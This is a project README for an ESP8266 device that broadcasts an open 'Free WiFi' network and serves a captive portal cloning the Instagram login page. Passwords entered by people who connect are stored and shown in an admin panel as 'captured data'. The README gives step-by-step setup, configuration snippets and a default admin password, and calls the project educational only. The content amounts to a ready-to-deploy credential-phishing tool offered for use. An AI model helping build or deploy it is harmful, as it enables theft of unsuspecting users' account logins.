# 📱 Instagram Portal WiFi Captive

<div align="center">

![ESP8266](https://img.shields.io/badge/ESP8266-v3.1.2-blue.svg)
![Arduino](https://img.shields.io/badge/Arduino-IDE%202.0+-green.svg)
![License](https://img.shields.io/badge/License-Educational-red.svg)
![Version](https://img.shields.io/badge/Version-1.0.0-orange.svg)
![Build](https://img.shields.io/badge/Build-Passing-success.svg)
![Security](https://img.shields.io/badge/Security-Tested-success.svg)
![ESP](https://img.shields.io/badge/ESP-Supported-blue.svg)
![WiFi](https://img.shields.io/badge/WiFi-Compatible-brightgreen.svg)

![NodeMCU](https://shields.io/badge/NodeMCU-ESP8266-blue?logo=arduino&style=for-the-badge)
![Portal](https://shields.io/badge/Captive-Portal-red?logo=wifi&style=for-the-badge)
![Instagram](https://shields.io/badge/Instagram-Clone-purple?logo=instagram&style=for-the-badge)

</div>

## 👨‍💻 Author
- **Caro Nero** - *Initial work* - [caronero](https://github.com/caronero)

### Connect with me:
[![GitHub](https://img.shields.io/badge/GitHub-caronero-black?style=flat&logo=github)](https://github.com/caronero)
[![YouTube](https://img.shields.io/badge/YouTube-@caronero-red?style=flat&logo=youtube)](https://www.youtube.com/@caronero)
[![Instagram](https://img.shields.io/badge/Instagram-cn__zd46-purple?style=flat&logo=instagram)](https://instagram.com/cn_zd46)
[![Telegram](https://img.shields.io/badge/Telegram-cn__zd-blue?style=flat&logo=telegram)](https://t.me/cn_zd)

```
     ┌──────────────┐
     │   ESP8266    │
     │  WiFi Portal │
     └──────────────┘
           │
           ▼
    ┌──────────────┐
    │  Captive     │
    │   Portal     │
    └──────────────┘
           │
           ▼
┌──────────────────────┐
│  Instagram Interface │
└──────────────────────┘
```

## 🌟 System Overview
```
┌─────────────────┐      ┌──────────────┐      ┌──────────────┐
│    User Device  │ ──── │   ESP8266    │ ──── │ Admin Panel  │
│    (Phone/PC)   │      │  WiFi Portal │      │   /admin     │
└─────────────────┘      └──────────────┘      └──────────────┘
                               │
                               ▼
                        ┌──────────────┐
                        │  Credential  │
                        │   Storage    │
                        └──────────────┘
```

## 📱 Interface Preview
```
┌────────────────────────────┐
│      Instagram Login       │
├────────────────────────────┤
│   ┌──────────────────┐    │
│   │     Instagram    │    │
│   └──────────────────┘    │
│                           │
│   ┌──────────────────┐    │
│   │    Username      │    │
│   └──────────────────┘    │
│                           │
│   ┌──────────────────┐    │
│   │    Password      │    │
│   └──────────────────┘    │
│                           │
│   ┌──────────────────┐    │
│   │     Log In       │    │
│   └──────────────────┘    │
└────────────────────────────┘
```

## 📝 Project Description
An advanced ESP8266-based system that creates a WiFi access point with a captive portal simulating the Instagram login interface. Perfect for educational purposes and understanding how wireless network portals work.

## ✨ Key Features
- 🎯 Pixel-perfect Instagram login interface clone
- 🌐 Automatic captive portal redirection
- 💾 Secure credential storage system
- 🔐 Password-protected admin dashboard
- 📱 Responsive design for all devices
- ⚡ Fast and reliable connection
- 🔄 Automatic WiFi network broadcast
- 📊 Real-time connection monitoring

## 🛠️ Hardware Requirements
- ESP8266 Development Board (Recommended models):
  - NodeMCU ESP8266
  - Wemos D1 Mini
  - ESP-12E Module
- Micro USB cable for programming
- Power source (USB/Battery)

## 💻 Software Requirements
### Required Tools
- Arduino IDE (2.0+ recommended)
- ESP8266 Board Package
- Web Browser

### Required Libraries
```cpp
#include <ESP8266WiFi.h>      // WiFi functionality
#include <DNSServer.h>        // DNS Server for captive portal
#include <ESP8266WebServer.h> // Web Server functionality
```

## 📥 Installation Guide
1. **Arduino IDE Setup**
   ```bash
   # Install ESP8266 Board Package
   http://arduino.esp8266.com/stable/package_esp8266com_index.json
   ```

2. **Required Libraries**
   - Go to Tools > Manage Libraries
   - Install all required libraries listed above

3. **ESP8266 Configuration**
   - Board: "NodeMCU 1.0 (ESP-12E Module)"
   - Upload Speed: "115200"
   - CPU Frequency: "80 MHz"
   - Flash Size: "4MB (FS:2MB OTA:~1019KB)"

## 🚀 Quick Start
1. Clone this repository
   ```bash
   git clone https://github.com/caronero/instagram_portal.git
   ```
2. Open `instagram_portal.ino` in Arduino IDE
3. Configure your settings in the code:
   ```cpp
   const char* ssid = "Free WiFi";            // Change network name
   const char* admin_password = "your_pass";   // Change admin password
   ```
4. Upload to your ESP8266
5. Power on your device

## 📱 Usage Instructions
1. **Initial Setup**
   - Power on the ESP8266
   - Look for "Free WiFi" network
   - Connect to the network

2. **Access Points**
   - Main Portal: `http://192.168.4.1`
   - Admin Panel: `http://192.168.4.1/admin`
   - Default Password: `zaid46`

3. **Admin Dashboard Features**
   - View captured data
   - Monitor active connections
   - System statistics
   - Real-time logs

## ⚙️ Configuration Options
```cpp
// Network Configuration
const char* ssid = "Free WiFi";              // WiFi Network Name
const char* admin_password = "zaid46";       // Admin Panel Password
const IPAddress apIP(192, 168, 4, 1);       // Portal IP Address
const byte DNS_PORT = 53;                    // DNS Port

// Storage Configuration
#define MAX_CREDENTIALS 50                   // Maximum stored entries
```

## 🔍 Troubleshooting
Common issues and solutions:

| Issue | Solution |
|-------|----------|
| Device not broadcasting | Check power supply |
| Can't access admin panel | Verify IP address |
| Portal not redirecting | Clear browser cache |
| Connection drops | Check ESP8266 power |

## 🛡️ Security Notice
This tool is designed for **EDUCATIONAL PURPOSES ONLY**. Usage of this tool for attacking targets without prior mutual consent is illegal. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

## 🤝 Contributing
Contributions are welcome! Please feel free to submit a Pull Request.

## 📄 License
This project is licensed for educational purposes only. Not for commercial or malicious use.

## ⚠️ Disclaimer
This project is for educational purposes only. The developers do not endorse or encourage any malicious use of this code.

## 📧 Contact
For educational and development inquiries only:
- Create an issue in this repository
- Submit a pull request

---
<div align="center">
Made with ❤️ for educational purposes only
</div> 
